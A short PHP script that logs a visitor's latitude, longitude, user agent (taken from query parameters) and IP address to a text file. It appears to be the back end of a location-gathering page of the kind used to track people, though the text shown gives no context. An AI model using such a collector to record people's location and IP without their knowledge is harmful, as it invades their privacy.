<?php
$myfile = fopen("location.txt", "w");
$txt = "lat: " . $_GET["latitute"] . "\nlong: " . $_GET["longitude"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] 
    . "\nUser Agent: " . $_GET["uagent"];
fwrite($myfile, $txt);
fclose($myfile);
?>